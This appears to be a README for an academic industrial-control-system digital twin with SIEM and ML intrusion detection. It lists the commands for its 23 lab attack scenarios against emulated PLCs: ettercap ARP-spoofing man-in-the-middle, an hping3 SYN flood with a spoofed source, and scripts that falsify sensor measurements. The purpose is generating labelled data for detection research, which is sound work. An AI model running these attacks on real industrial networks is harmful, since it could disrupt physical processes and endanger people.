# DigitalTwin-SIEM-integration

**Installation**

Installation steps for the whole implementation with Docker Compose are as follows: 
(Please refer https://github.com/FrauThes/DigitalTwin-SIEM-integration/blob/master/README.md for the implementation without the IDS docker container)

1. After installing Docker Compose, clone the repository.
2. Add root user to the local access control list of xhost on "Docker host", not inside container.
    ```
    sudo xhost +si:localuser:root  
    ```
4. Run the init script:
    ```bash
    cd /deployments/docker && sudo sh init.sh
    ```
3. Enter the IP address or Hostname of the server when requested. For example:
    ```
    Enter the Hostname or IP Address where your elasticsearch will be deployed:10.0.2.15
    ```
    At this step, the script is trying to import the Dsiem dashboard to Kibana. This may take a few minutes. Until Kibana is up and running, error messages are shown. This is       normal. Example error message:
    ```
    curl: (22) The requested URL returned error: 503 Service Unavailable
    cannot connect to localhost:5601, will retry in 5 sec ..
    ```
5.  Once the project is ready, access kibana and IDS in browser.
    Kibana port 5601 , IDS (url comes on console) port 8888
    
The Project is up and running. If you want to start it a second time you simply have to navigate to deployments/docker and run `docker-compose up`.

**NOTE**: All the required packages, softwares and libraries are included with Docker. No need of installing these separately.

**Data collection**

Once the docker compose is up, 8 xterm consoles will pop up on the terminal (2 for s1, 2 for plc1, 1 for plc2, 1 for plc3, 1 for hmi and 1 for attacker node).
To trigger data collection, run the following command on hmi terminal
```
python trigger.py <x>
```
Here x corresponds to the minutes for which data (process measuremnets) needs to be collected. For examples, if data needs to be collected for 2 hours, enter x as 120.

The collected dataset is stored as 'data.csv' in logs folder.

Automated labelling of the generated dataset is done in two steps: 

1) Run label.py script to label dataset based on threshold conditions (For command injection and network DoS)
   ```
   python label.py
   ```
2) Run label1.py after step 1 by passing 3 arguments (start_time, end_time and attack type). Results are stored as 'labelled.csv' in the logs folder.
   ```
   python label1.py '2021-07-01 16:04:07.681880' '2021-07-01 16:05:11.900075' Calculated Measurement Modification 
   ```

**Executing attacks**

Note: Launch all attacks from attacker node terminal.

IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3, HMI <--> 10.0.0.4, ATTACKER <--> 10.0.0.5

**Attack scenario 1** (Command injection): Run the following script to launch this attack for x minutes.

    python attack_fdi.py <x>

**Attack scenarios 2, 3, 4** (Network DoS: MitM): Run the following commands for attack scenarios 2, 3, 4, respectively.

    ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.2//
    ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.3//
    ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// 

**Attack scenario 5** (Network DoS: TCP SYN flooding)

    hping3 -S -a 10.0.0.4 --flood -V -p 44818 10.0.0.1

**Note**: Attack scenarios 6 till 23 are done using MitM attacks. Attacker node is placed b/w two nodes and IP forwarding is enabled using the following commands.

    ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// &
    echo 1 > /proc/sys/net/ipv4/ip_forward

**Attack scenarios 6,7,8** (Naive Measurement Modification): Run the following commands for attack scenarios 6, 7, 8, respectively. These attack scenarios modify the measurements to a constant value.

    python attack_sensor_constant.py PLC2
    python attack_sensor_constant.py PLC3
    python attack_sensor_constant.py BOTH


**Attack scenario 9,10,11 (Naive Measurement Modification): Run the following commands for attack scenarios 9, 10, 11, respectively. These attack scenarios modify the measurements to a random value within the predefined limits of the process measurements.

    python attack_sensor_random_withinlimits.py PLC2
    python attack_sensor_random_withinlimits.py PLC3
    python attack_sensor_random_withinlimits.py BOTH
    
**Attack scenarios 12,13,14 (Calculated Measurement Modification with +ve scaling) and Attack scenarios 15,16,17 (Calculated Measurement Modification with negative scaling). Here, the scaloing factor used is a uniform random value in the range (0,1].

    python attack_sensor_randomp.py PLC2
    python attack_sensor_randomp.py PLC3
    python attack_sensor_randomp.py BOTH
    python attack_sensor_randomn.py PLC2
    python attack_sensor_randomn.py PLC3
    python attack_sensor_randomn.py BOTH


**Attack scenarios 18,19,20 (Calculated Measurement Modification with positive scaling) and Attack scenarios 21,22,23 (Calculated Measurement Modification with negative scaling). Here, the scaling factor used is a fixed value.

    python attack_sensor_scaling.py PLC2 +
    python attack_sensor_scaling.py PLC3 +
    python attack_sensor_scaling.py BOTH +
    python attack_sensor_scaling.py PLC2 -
    python attack_sensor_scaling.py PLC3 -
    python attack_sensor_scaling.py BOTH -


**Running ML-based IDS**

Run ML_based IDS by running the Jupyter notebook ML_IDS.ipynb launched using IDS url. Results of IDS can be seen in 'IDS' dashboard in Kibana.

## Reference
[ARES'20](https://doi.org/10.1145/3407023.3407039)
